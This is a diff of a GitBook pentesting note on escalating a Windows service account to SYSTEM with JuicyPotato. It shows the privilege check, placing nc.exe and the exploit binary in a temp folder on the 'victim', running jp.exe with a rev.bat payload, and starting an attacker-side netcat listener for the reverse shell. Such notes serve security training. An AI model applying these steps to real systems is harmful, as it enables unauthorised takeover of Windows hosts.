@@ -1,6 +1,8 @@
-# Windows Privilege Escalation
+# Untitled
 
-## JuicyPotato
+## Windows Privilege Escalation
+
+### JuicyPotato
 
 JuicyPotato is an automation PE script to escalate privilege from a Windows Service Accounts to NT AUTHORITY\SYSTEM.&#x20;
 
@@ -12,7 +14,9 @@ systeminfo
 
 You need a unique CLSID for different Windows OS. You can pick CLSID from [https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md)
 
-![](broken-reference)
+
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 Check if the victim is vulnearble to JuicyPotato PE script. SeImpersonatePrivilege should be enabled.
 
@@ -20,7 +24,7 @@ Check if the victim is vulnearble to JuicyPotato PE script. SeImpersonatePrivile
 C:\Windows\system32>whoami /priv
 ```
 
-![](broken-reference)
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 Download nc.exe and juicypotato.exe to the victim host , then simply upload both to a writable directoy. I normall just write to a temp folder under \appdata\local\temp\\.
 
@@ -51,7 +55,7 @@ Then run Juicy with the correct  `clsid.`
 jp.exe -t * -p C:\users\user\appdata\local\temp\rev.bat -l 1340 -c '{8F5DF053-3013-4dd8-B5F4-88214E81C0CF}'
 ```
 
-On the attacker Kali host, start the listener
+On the attacker host, start the listener with some uncommon port
 
 ```
 nc -lnvp 1340 
